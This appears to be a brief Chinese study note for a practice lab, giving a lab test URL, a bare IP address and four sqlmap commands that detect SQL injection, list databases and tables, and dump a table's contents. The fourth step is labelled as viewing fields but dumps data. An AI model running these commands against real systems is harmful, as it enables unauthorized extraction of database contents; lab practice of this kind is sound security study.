测试网址：http://a5fa4ee523e3.target.yijinglab.com/index.php

http://95.40.143.1:3000/

1：测试是否有漏洞
sqlmap -u "你要测试的网址"

2：查看数据库
sqlmap -u "你要测试的网址" --dbs

3：查看数据库中的表
sqlmap -u "你要测试的网址" -D 数据库名 --tables

4：查看表中的字段
sqlmap -u "你要测试的网址" -D 数据库名 -T 表名 --dump